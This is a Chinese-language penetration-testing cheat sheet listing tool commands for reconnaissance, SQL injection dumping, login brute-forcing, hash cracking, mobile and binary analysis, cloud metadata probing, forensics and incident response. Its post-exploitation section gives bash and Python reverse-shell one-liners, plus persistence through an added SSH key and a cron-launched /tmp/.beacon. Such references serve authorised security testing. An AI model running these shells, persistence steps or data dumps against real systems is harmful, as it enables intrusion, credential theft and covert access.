# 命令速查表

## 信息收集
```bash
subfinder -d {domain} -o subs.txt
httpx -l subs.txt -status-code -title -tech-detect -o alive.txt
nmap -sV -sC --top-ports 1000 -iL ips.txt -oA nmap
masscan -p1-65535 --rate=1000 {target}
gau {domain} | sort -u > urls.txt
whatweb -i alive.txt
```

## Web 渗透
```bash
nuclei -u {url} -severity critical,high -tags cve,sqli,rce
sqlmap -u "..." --batch --dbs
sqlmap -u "..." -D db -T users --dump --start 1 --stop 3
ffuf -u https://{target}/FUZZ -w wordlist.txt
hydra -l admin -P passwords.txt {target} http-form-post "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

## 密码攻击
```bash
john --wordlist=rockyou.txt hashes.txt
hashcat -m 0 hashes.txt rockyou.txt      # MD5
hashcat -m 1000 hashes.txt rockyou.txt   # NTLM
hashcat -m 1800 hashes.txt rockyou.txt   # sha512crypt
```

## 移动安全
```bash
adb devices -l
adb shell pm list packages -3
adb pull /data/app/{path}/base.apk
apktool d target.apk -o apk_out/
jadx target.apk -d jadx_out/
frida -U -l ssl_pinning.js -f {package}
frida-dexdump -U -f {package}
```

## 逆向工程
```bash
file {binary} && strings {binary} | head -100
objdump -d {binary} | head -50
rabin2 -I {binary} && rabin2 -z {binary}
rabin2 -E libnative.so
```

## 后渗透
```bash
# 提权
sudo -l && find / -perm -4000 -type f 2>/dev/null
# 反弹Shell
bash -i >& /dev/tcp/{ip}/{port} 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# 持久化
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
(crontab -l; echo "*/5 * * * * /tmp/.beacon") | crontab -
```

## OPSEC
```bash
proxychains nmap -sT -Pn {target}
ssh -D 1080 user@pivot
torsocks curl {target}
nmap -T2 --max-retries 1 --scan-delay 1s {target}
```

## 云安全
```bash
curl http://169.254.169.254/latest/meta-data/
aws s3 ls s3://{bucket} --no-sign-request
kubectl get pods --all-namespaces
```

## 取证
```bash
adb backup -f backup.ab {package}
tcpdump -i any -w capture.pcap
dd if=/dev/sda of=disk.img bs=4M
strings mem.dump | grep -i "password\|key\|flag"
```

## DNS
```bash
dig axfr @{ns} {domain}
dnsrecon -d {domain} -t axfr
dig @8.8.8.8 {domain} +short && dig @1.1.1.1 {domain} +short
```

## TLS
```bash
openssl s_client -connect {target}:443 | openssl x509 -text -noout
nmap --script ssl-enum-ciphers -p 443 {target}
curl -sI https://{target} | grep -i "strict-transport-security"
```

## 应急响应
```bash
ps aux | grep -v "\[" && netstat -an | grep ESTABLISHED
find / -mtime -1 -type f 2>/dev/null | head -50
iptables -A INPUT -s {ip} -j DROP
cat /var/log/auth.log | grep "Failed"
```